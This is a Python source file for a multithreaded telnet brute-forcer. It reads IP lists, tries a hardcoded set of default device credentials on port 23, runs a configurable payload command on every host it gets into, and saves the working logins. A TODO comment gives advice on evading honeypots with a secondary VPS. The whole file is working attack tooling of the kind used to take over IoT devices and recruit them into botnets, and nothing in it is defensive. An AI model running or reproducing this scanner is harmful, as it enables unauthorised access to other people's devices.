import os
import sys
import threading
import telnet
import concurrent.futures

VERSION = "1.0"

IP_FILE = "source.txt"
VALID_FILE = "valid.txt"
INVALID_FILE = "invalid.txt"
COMMAND_OUTPUT_FILE = "cmd.txt"

# TODO:
# To skip honey ports kill ips that have multiple ports open with diff credentials
# You can also set a mimick payload and check your infra (if they are attempting a ddos) < make sure your payload is connected to venv that can read traffic on your infra (reject packets but still read the output < make sure you open a random port - and use a secondary vps to host your mimick payload to fw honeypots)

CREDENTIALS = [
    ("root", "root"),
    ("root", ""),
    ("root", "icatch99"),
    ("admin", "admin"),
    ("user", "user"),
    ("admin", "VnT3ch@dm1n"),
    ("telnet", "telnet"),
    ("root", "86981198"),
]

TELNET_TIMEOUT = 0.1
MAX_WORKERS = 10
PAYLOAD = "echo PAYLOAD WORKING"


def read_hosts(folder_name):
    try:
        file = open(os.path.join(folder_name, IP_FILE), "r")
        return (x.strip() for x in file if x.strip()), file
    except FileNotFoundError:
        print(f"Error: folder {folder_name} not found!!")
        return [], None


def execute_command(tn: telnet.TelnetClient, command: str):
    tn.write(command.encode("ascii") + b"\n")
    response = tn.read_until(b"$")
    return response.decode(errors="ignore").strip()


def try_login(host: str, username: str, password: str):
    try:
        with telnet.TelnetClient(host, 23, TELNET_TIMEOUT) as tn:
            tn.read_until(b"login: ")
            tn.write(username.encode("ascii") + b"\n")
            tn.read_until(b"Password: ")
            tn.write(password.encode("ascii") + b"\n")

            response = tn.read_until(b"$")
            if b"$" in response or b"#" in response:
                print(f"[+] VALID: {host} | {username}:{password}")
                command_output = execute_command(tn, PAYLOAD)
                print(f"[COMMAND OUTPUT] {host}:\n{command_output}")
                return (
                    f"{host} {username} {password}\n",
                    f"{host}:\n{command_output}\n\n",
                    None,
                )
    except Exception:
        pass
    return None, None, f"{host}\n"


def scan_host(host):
    global lock, number, valids, invalids, done
    with lock:
        number += 1
    for username, password in CREDENTIALS:
        login_result, command_result, invalid_result = try_login(
            host, username, password
        )
        if login_result:
            with lock:
                valids += 1
                done += 1
            return login_result, command_result, None
    with lock:
        invalids += 1
        done += 1
    return None, None, invalid_result


def loading_bar(progress, total, length=30):
    percent = progress / total
    filled = int(length * percent)
    bar = "#" * filled + "-" * (length - filled)
    return f"[{bar}] {int(percent * 100)}%"


def main(argv: list) -> int:
    if len(argv) < 2 or "-h" in argv:
        print(
            """Usage: %s %s <folder_name> [-c] [-v] [-i]

            This utility script brute-force all IPs in the "folder_name" folder.
            Arguments:
                "folder_name" -> Required, the folder that contain the IPs and will contain saved IPs.
                "-c" -> Optional, Log payload command output.
                "-v" -> Optional, Do not Log valid logins (Strange but ok).
                "-i" -> Optional, Log Invalid logins.

                "-h" -> Print this message
            
            %s - by dalas_16, improved by _hackerbob_
            Version {VERSION}
            
            """
            % (sys.executable, sys.argv[0])
        )
        return 1
    else:
        folder_name = argv[1]
        log_commands = "-c" in argv
        log_valids = "-v" not in argv
        log_invalids = "-i" in argv

    hosts, file = read_hosts(folder_name)
    if not hosts:
        print("No hosts found.")
        return 1
    print("Starting bruteforce")
    global lock, number, valids, invalids, done
    number = 0
    done = 0
    valids = invalids = 0
    lock = threading.Lock()
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        results = executor.map(scan_host, hosts)
        with open(os.path.join(folder_name, VALID_FILE), "w") as valid_file:
            with open(os.path.join(folder_name, COMMAND_OUTPUT_FILE), "w") as cmd_file:
                with open(os.path.join(folder_name, INVALID_FILE), "w") as invalid_file:
                    for login_result, command_result, invalid_result in results:
                        print(
                            f"\rStatus: {done} / {number}, {valids=} {invalids=} {loading_bar(done,number)}",
                            end="",
                        )
                        if log_valids and login_result:
                            valid_file.write(login_result)
                        if log_commands and command_result:
                            cmd_file.write(command_result)
                        if log_invalids and invalid_result:
                            invalid_file.write(invalid_result)
    print("\nBruted all IPs. Valid: %s Invalid: %s" % (valids, invalids))
    file.close()
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv))
